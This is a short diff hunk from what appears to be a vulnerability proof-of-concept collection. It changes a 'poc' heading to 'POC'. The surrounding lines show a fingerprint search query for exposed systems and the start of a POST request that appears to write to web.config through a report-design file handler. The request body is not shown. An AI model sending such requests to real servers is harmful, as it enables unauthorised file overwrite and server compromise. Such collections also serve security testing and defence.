@@ -13,7 +13,7 @@
 icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
 ```
 
-## poc
+## POC
 ```
 POST /ReportDesign/RepFile.ashx?RepFile=pages/web.config&Type=SaveRepFileData HTTP/1.1
 Host: youjiasoft.mrxn.net
